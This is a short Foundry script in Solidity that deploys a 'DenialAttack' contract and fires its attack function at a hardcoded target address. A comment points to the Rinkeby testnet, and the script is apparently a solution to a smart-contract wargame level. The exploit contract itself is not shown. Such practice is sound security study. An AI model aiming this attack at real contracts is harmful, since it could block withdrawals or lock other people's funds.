// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import { Script } from "forge-std/script.sol";

import { DenialAttack } from "src/Denial/DenialAttack.sol";

contract DenialAttackScript is Script {

    // our attack contract: https://rinkeby.etherscan.io/address/0x160b64858660a337dabf824b5f869d81ee2ae175
    function run() public {
        address denialTarget = address(0xEC5789081AbDbdd55A3610f49401A8511bebc48e);

        vm.startBroadcast();
        DenialAttack attacker = new DenialAttack();
        attacker.attack(denialTarget);
        vm.stopBroadcast();
    }
}
